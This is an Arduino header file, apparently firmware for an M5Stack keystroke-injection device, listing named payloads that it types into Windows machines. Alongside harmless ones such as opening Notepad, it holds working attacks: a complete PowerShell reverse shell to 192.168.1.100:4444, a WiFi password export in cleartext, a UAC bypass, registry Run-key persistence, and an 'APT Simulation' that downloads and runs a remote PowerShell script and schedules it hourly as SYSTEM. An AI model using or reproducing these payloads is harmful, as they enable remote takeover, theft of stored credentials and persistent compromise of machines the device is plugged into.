#ifndef PAYLOADS_H
#define PAYLOADS_H

#include <Arduino.h>

// Struktur für Payloads
struct Payload {
    const char* name;
    const char* commands;
    const char* description;
};

// ==================== WINDOWS PAYLOADS ====================

const Payload windowsPayloads[] = {
    {
        "Win: CMD öffnen",
        "DELAY 1000\nGUI r\nDELAY 300\nSTRING cmd\nENTER\nDELAY 500",
        "Öffnet die Kommandozeile"
    },
    {
        "Win: PowerShell",
        "DELAY 1000\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500",
        "Öffnet PowerShell"
    },
    {
        "Win: Reverse Shell",
        "DELAY 2000\nGUI r\nDELAY 300\nSTRING powershell -w h -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\nENTER",
        "PowerShell Reverse Shell"
    },
    {
        "Win: System Info",
        "DELAY 1000\nGUI r\nDELAY 300\nSTRING cmd\nENTER\nDELAY 500\nSTRING systeminfo\nENTER\nDELAY 2000\nSTRING ipconfig /all\nENTER",
        "Sammelt Systeminformationen"
    },
    {
        "Win: Notepad Test",
        "DELAY 1000\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 500\nSTRING M5Stack Test erfolgreich!\n",
        "Testet USB HID mit Notepad"
    },
    {
        "Win: WiFi Passwords",
        "DELAY 1000\nGUI r\nDELAY 300\nSTRING cmd\nENTER\nDELAY 500\nSTRING netsh wlan show profiles\nENTER\nDELAY 2000\nSTRING netsh wlan export profile key=clear\nENTER",
        "Zeigt gespeicherte WiFi Passwörter"
    },
    {
        "Win: UAC Bypass",
        "DELAY 1000\nGUI r\nDELAY 300\nSTRING computerdefaults.exe\nENTER\nDELAY 2000\nTAB\nTAB\nTAB\nENTER\nDELAY 1000",
        "UAC Bypass mit computerdefaults"
    },
    {
        "Win: Persistence",
        "DELAY 1000\nGUI r\nDELAY 300\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f\nENTER",
        "Fügt Persistence via Registry hinzu"
    }
};

// ==================== BLUETOOTH PAYLOADS ====================

const Payload bluetoothPayloads[] = {
    {
        "BT: Device Scan",
        "BT_INIT\nDELAY 1000\nBT_SCAN\nDELAY 8000",
        "Scannt nach Bluetooth Geräten"
    },
    {
        "BT: Spoof Device",
        "BT_INIT\nDELAY 1000\nSTRING AT+NAME=iPhone\nENTER",
        "Spooft Bluetooth Namen"
    }
};

// ==================== WIFI PAYLOADS ====================

const Payload wifiPayloads[] = {
    {
        "WiFi: Connect",
        "WIFI_CONNECT YourSSID YourPassword",
        "Verbinde mit WiFi Netzwerk"
    },
    {
        "WiFi: Start Server",
        "WIFI_START_SERVER",
        "Startet Web Control Server"
    }
};

// ==================== KOMBINIERTE PAYLOADS ====================

const Payload combinedPayloads[] = {
    {
        "APT Simulation",
        "DELAY 2000\nGUI r\nSTRING powershell -w h -nop -c \"iwr http://192.168.1.100/stage1.ps1 -OutFile $env:TEMP\\s1.ps1; .$env:TEMP\\s1.ps1\"\nENTER\nDELAY 5000\nSTRING schtasks /create /tn SystemHealth /tr 'powershell -w h -file $env:TEMP\\s1.ps1' /sc hourly /mo 1 /ru SYSTEM\nENTER",
        "Multi-Stage APT Simulation"
    }
};

// ==================== GESAMTLISTE ====================

const int windowsCount = sizeof(windowsPayloads) / sizeof(Payload);
const int bluetoothCount = sizeof(bluetoothPayloads) / sizeof(Payload);
const int wifiCount = sizeof(wifiPayloads) / sizeof(Payload);
const int combinedCount = sizeof(combinedPayloads) / sizeof(Payload);
const int totalPayloads = windowsCount + bluetoothCount + wifiCount + combinedCount;

// Kombiniertes Array aller Payloads
Payload payloads[totalPayloads];

// Hilfsfunktion zum Initialisieren
void initPayloads() {
    int index = 0;
    
    // Windows Payloads kopieren
    for(int i = 0; i < windowsCount; i++) {
        payloads[index++] = windowsPayloads[i];
    }
    
    // Bluetooth Payloads kopieren
    for(int i = 0; i < bluetoothCount; i++) {
        payloads[index++] = bluetoothPayloads[i];
    }
    
    // WiFi Payloads kopieren
    for(int i = 0; i < wifiCount; i++) {
        payloads[index++] = wifiPayloads[i];
    }
    
    // Kombinierte Payloads kopieren
    for(int i = 0; i < combinedCount; i++) {
        payloads[index++] = combinedPayloads[i];
    }
}

// Anzahl der Payloads
const int payloadCount = totalPayloads;

#endif
